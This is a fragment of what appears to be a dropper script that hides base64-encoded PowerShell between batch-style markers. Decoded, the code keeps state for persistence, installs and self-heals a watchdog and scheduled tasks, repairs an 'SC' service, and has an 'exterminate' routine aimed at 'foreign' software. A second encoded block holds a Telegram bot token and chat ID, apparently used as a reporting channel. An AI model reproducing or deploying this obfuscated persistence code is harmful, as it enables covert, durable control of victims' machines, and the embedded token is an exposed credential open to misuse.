ICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5kICRwcmltIC1lcSAnUnVubmluZycpIHsgJGlu
c3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9IFtvcmRlcmVkXUB7CiAgICAgICAgaG9zdCAgICAg
ICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUp
LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykKICAgICAgICBidWlsZCAgICAgICAgPSAk
QnVpbGQKICAgICAgICBwcmltICAgICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2Ug
eyAnTUlTU0lORycgfSkKICAgICAgICBhbHQgICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQg
fSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgZ3J5eGEgICAgICAgID0gJChpZiAoJHNjcmlw
dDpncnl4YSkgeyAkc2NyaXB0OmdyeXhhIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGdy
eXhhRnAgICAgICA9ICRncnl4YUZwCiAgICAgICAgZm9yZWlnbiAgICAgID0gJGZvcmVpZ24KICAg
ICAgICB0YXNrc09rICAgICAgPSAkdGFza3NPawogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNr
c1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAgID0gJHdkCiAgICAgICAgaW5zdGFsbENvdW50ID0g
JGluc3RhbGxDb3VudAogICAgICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0
LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxh
c3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0gZWxzZSB7ICRudWxsIH0pCiAgICAgICAgbm90ZSAg
ICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXBy
ZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQogICAgcmV0
dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rpb24pIHsKICAgICdpbml0JyAgICAgICAgICAgIHsg
JGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gt
T2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnaWRlbnRpdHknICAgICAg
ICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9i
amVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQogICAgJ3dhdGNoZG9nJyAgICAgICAg
eyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51bGwgfQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBF
bnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tzLWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRh
c2tzIH0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRvLUpz
b24gLUNvbXByZXNzIH0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAk
RnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAgeyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQogICAg
J2V4dGVybWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQogICAgJ2dyeXhhLWhlYWx0
aCcgICAgeyBUZXN0LUdyeXhhSGVhbHRoIH0KICAgICdncnl4YS1lbnN1cmUnICAgIHsgSW52b2tl
LUdyeXhhRW5zdXJlIH0KfQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
